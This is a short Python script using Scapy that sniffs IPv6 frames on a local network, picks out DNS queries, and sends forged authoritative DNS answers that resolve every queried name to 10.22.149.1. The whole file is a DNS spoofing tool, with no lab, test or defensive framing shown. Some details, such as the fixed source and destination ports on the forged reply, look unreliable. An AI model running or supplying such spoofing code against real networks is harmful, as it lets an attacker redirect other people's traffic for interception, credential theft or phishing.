import socket
import time
from scapy.all import *
def sniff_ip6_dns(s, start, timelimit):
    pkts_buff = []
    while (time.time() - start) < timelimit:
        frame, addr = s.recvfrom(512)
        try:
            pkt = Ether(frame)
            dnsHeader = pkt.getlayer(DNS)
            dnsID = dnsHeader.id
            dnsRecord = dnsHeader.qd.qname
            srcIP = pkt.getlayer(IPv6).src
            fake_answer(srcIP, dnsID, dnsRecord)
            pkts_buff.append(pkt)
        except:
            pass
    return pkts_buff

def sniff_ip6(s, start, timelimit):
    frame_buff = []
    while (time.time() - start) < timelimit:
        frame, addr = s.recvfrom(512)
        if frame[12:14] == b'\x86\xdd': # Filter for IPv6
             frame_buff.append(frame)
    return frame_buff

def filter_dns(frame_buff):
    pkts_buff = []
    for frame in frame_buff:
        pkt = Ether(frame) # Normalize to Scapy packet format
        srcIP = pkt.getlayer(IPv6).src
        try:
            if pkt.getlayer(UDP).dport == 53:
                pkts_buff.append(pkt)
                #fake_answer(srcIP, pkt.getlayer(DNS).id, pkt.getlayer(DNS).qd.qname)
        except:
            pass
    return pkts_buff

def fake_answer(srcIP, dnsID, name):
    ans = DNS(qr=1, aa=1, ra=1, qdcount=1, ancount=1)
    ans.qd = DNSQR(qname=name, qtype="A")
    ans.an = DNSRR(rrname=name, type="A", rdata="10.22.149.1")
    send(IPv6(dst=srcIP)/UDP(sport=53, dport=53)/ans, verbose=0)
